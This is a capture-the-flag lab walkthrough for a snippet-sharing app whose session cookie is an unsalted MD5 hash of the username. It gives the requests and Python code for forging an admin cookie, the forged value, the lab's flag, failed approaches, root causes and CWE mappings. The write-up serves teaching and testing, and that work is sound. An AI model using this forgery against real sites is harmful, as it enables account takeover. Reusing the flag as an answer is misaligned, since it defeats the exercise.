# copypasta-006 - BugForge Lab Walkthrough

**URL:** https://lab-1783652401084-t7gxuw.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Forgeable session token (unsalted md5(username)) leading to admin account takeover
**Flag:** `bug{Ji0S4ePJ0fJ9fZm9tUZpTh28mt3Y3dPv}`

---

## Summary

CopyPasta is a code snippet sharing app, similar to Pastebin or GitHub Gist. Authentication uses a cookie named `session` that looks opaque at first glance but is actually just an unsalted MD5 hash of the username, base64 encoded, with no server side secret, signature, or per session randomness mixed in. Any username can be turned into a valid session cookie for that account without ever touching a password. Forging a cookie for `admin` gives full account takeover in a single request.

## Tech Stack

- Frontend: React SPA (Create React App, MUI)
- Backend: Express.js
- Auth: cookie based session (not JWT)
- Storage: SQLite (inferred from seed data structure)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | role is hardcoded server side to `user`, mass assignment attempts on `role`/`is_admin` are ignored |
| `POST /api/login` | none | sets the `session` cookie |
| `GET /api/verify-token` | cookie | returns the current user object, `X-Flag` header is present when authenticated as admin |
| `GET /api/profile/:username` | cookie | returns the user record plus every snippet belonging to that user, including private ones; the frontend only hides non public snippets visually |
| `PUT /api/profile` | cookie | profile update, extra fields like `role` are ignored server side |
| `PUT /api/profile/password` | cookie | changes the password of whichever account the session belongs to, body supplied `user_id`/`username` fields are ignored |
| `GET /api/snippets/public` | none | every public snippet across all users, useful for username enumeration |

## Attack Chain

### Step 1 - Register a throwaway account

```
POST /api/register {"username":"pentest1","email":"pentest1@test.local","password":"Password123!"}
POST /api/login {"username":"pentest1","password":"Password123!"}
```

The login response sets a cookie:

```
session=MjFjNzlmOWNiNzBkNmI2NmM1OGI2M2JkYTc0MDUzMmY%3D
```

### Step 2 - Decode the cookie

URL decoding then base64 decoding the value gives:

```
21c79f9cb70d6b66c58b63bda740532f
```

That is a 32 character hex string, the shape of an MD5 digest.

### Step 3 - Confirm the derivation

```python
import hashlib
hashlib.md5(b"pentest1").hexdigest()
# 21c79f9cb70d6b66c58b63bda740532f
```

This matches exactly. The session cookie is `base64(md5(username))`. There is no secret key, no salt, and no server side session store validating the value against anything other than the username hash itself.

### Step 4 - Enumerate usernames

```
GET /api/snippets/public
```

This returns snippets tagged with their author's username, revealing seeded accounts: `coder123`, `pythonista`, `webdev`, and `admin`.

### Step 5 - Forge the admin session

```python
import hashlib, base64
base64.b64encode(hashlib.md5(b"admin").hexdigest().encode())
# MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
```

No login, no password, no prior admin session was ever observed. The cookie is computed entirely offline.

### Step 6 - Use the forged cookie

```
GET /api/verify-token
Cookie: session=MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
```

Response body confirms authentication as `admin` with `role: admin`. The flag is delivered in the `X-Flag` response header on this and other admin authenticated requests such as `/api/profile/admin`, not in the JSON body.

## Dead Ends

| Attempted | Result | Lesson |
|---|---|---|
| Mass assignment `role:admin` / `is_admin:true` on `/api/register` | Ignored, role stays `user` | Registration sanitizes privilege fields |
| Same mass assignment on `PUT /api/profile` | Ignored | Profile update also sanitizes role |
| `PUT /api/profile/password` with `user_id`/`username` pointed at admin | Only changes the caller's own password | Target account is derived purely from the session, not from the request body |
| Direct `GET /api/snippets/:id` | Route does not exist, SPA fallback returns 200 with the index page | Snippet detail is only reachable through the profile endpoint, the public list, or a share code |
| Guessing admin only routes like `/api/admin/*`, `/api/users`, `/api/flag` | All SPA fallback, none exist | No dedicated admin API surface, the flag rides on an existing endpoint's response header instead |
| Client side privacy filter on `/api/profile/:username` (server sends `is_public:0` snippets, client just does not render them) | Confirmed real information disclosure but unrelated to the flag | Worth flagging separately as its own bug, not the graded vulnerability here |

## Root Causes

- Session tokens are generated as `md5(username)` with no secret or HMAC key mixed in, making them fully reproducible offline by anyone who knows a valid username.
- There is no random per-session identifier and no server side session store that validates the token against anything beyond recomputing the same hash.
- Admin identity is determined solely by a value any client can forge, with no additional binding such as IP pinning, expiry tied to a secret, or rotation.

## CWE / OWASP

- CWE-330 (Use of Insufficiently Random Values) and CWE-345 (Insufficient Verification of Data Authenticity) for the session token.
- OWASP A07:2021 - Identification and Authentication Failures.
- Secondary: CWE-602 (Client-Side Enforcement of Server-Side Security) on `/api/profile/:username` leaking private snippet content.
